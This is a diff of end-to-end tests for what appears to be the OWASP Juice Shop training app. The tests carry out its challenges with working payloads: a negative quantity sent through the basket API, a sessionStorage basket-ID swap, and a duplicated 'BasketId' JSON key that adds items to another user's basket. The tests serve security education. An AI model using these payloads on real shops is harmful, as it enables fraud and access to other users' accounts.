@@ -8,13 +8,13 @@ describe('/#/basket', () => {
     describe('challenge "negativeOrder"', () => {
       it('should be possible to update a basket to a negative quantity via the Rest API', () => {
         browser.waitForAngularEnabled(false)
-        browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.put(\'/api/BasketItems/1\', {quantity: -100000});')
+        browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("PUT","http://localhost:3000/api/BasketItems/1", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"quantity": -100000}));') // eslint-disable-line
         browser.driver.sleep(1000)
         browser.waitForAngularEnabled(true)
 
         browser.get('/#/basket')
 
-        const productQuantities = element.all(by.repeater('product in products').column('BasketItem.quantity'))
+        const productQuantities = $$('mat-cell.mat-column-quantity > span')
         expect(productQuantities.first().getText()).toMatch(/-100000/)
       })
 
@@ -25,7 +25,7 @@ describe('/#/basket', () => {
       protractor.expect.challengeSolved({ challenge: 'Payback Time' })
     })
 
-    describe('challenge "accessBasket"', () => {
+    describe('challenge "Basket Access Tier 1"', () => {
       it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
         browser.executeScript('window.sessionStorage.bid = 3;')
 
@@ -34,7 +34,30 @@ describe('/#/basket', () => {
         // TODO Verify functionally that it's not the basket of the admin
       })
 
-      protractor.expect.challengeSolved({ challenge: 'Basket Access' })
+      protractor.expect.challengeSolved({ challenge: 'Basket Access Tier 1' })
+    })
+
+    describe('challenge "Basket Access Tier 2"', () => {
+      it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
+        browser.waitForAngularEnabled(false)
+        browser.executeScript(() => {
+          var xhttp = new XMLHttpRequest()
+          xhttp.onreadystatechange = function () {
+            if (this.status === 200) {
+              console.log('Success')
+            }
+          }
+
+          xhttp.open('POST', 'http://localhost:3000/api/BasketItems/')
+          xhttp.setRequestHeader('Content-type', 'text/plain')
+          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+          xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }') //eslint-disable-line
+        })
+        browser.driver.sleep(1000)
+        browser.waitForAngularEnabled(true)
+      })
+
+      protractor.expect.challengeSolved({ challenge: 'Basket Access Tier 2' })
     })
   })
 
@@ -53,7 +76,7 @@ describe('/#/basket', () => {
         element(by.id('collapseCouponButton')).click()
         browser.wait(protractor.ExpectedConditions.presenceOf($('#coupon')), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef
 
-        element(by.model('coupon')).sendKeys(insecurity.generateCoupon(90))
+        element(by.id('coupon')).sendKeys(insecurity.generateCoupon(90))
         element(by.id('applyCouponButton')).click()
       })
 
